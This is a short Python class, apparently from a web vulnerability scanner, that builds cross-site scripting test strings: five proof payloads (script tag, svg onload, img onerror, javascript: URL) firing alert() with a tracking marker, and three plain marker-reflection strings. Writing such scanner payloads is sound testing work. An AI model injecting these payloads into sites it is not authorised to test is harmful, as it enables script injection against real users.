from __future__ import annotations


class XssPayloadFactory:
    """Sinh payload XSS thật nhưng vẫn có marker để truy vết finding."""

    def proof_payloads(self, marker: str) -> list[str]:
        return [
            f'<script>alert("{marker}")</script>',
            f'"><svg/onload=alert("{marker}")>',
            f"'><svg/onload=alert(\"{marker}\")>",
            f'<img src=x onerror=alert("{marker}")>',
            f'javascript:alert("{marker}")',
        ]

    def marker_payloads(self, marker: str) -> list[str]:
        return [
            marker,
            f'">{marker}',
            f"'{marker}",
        ]
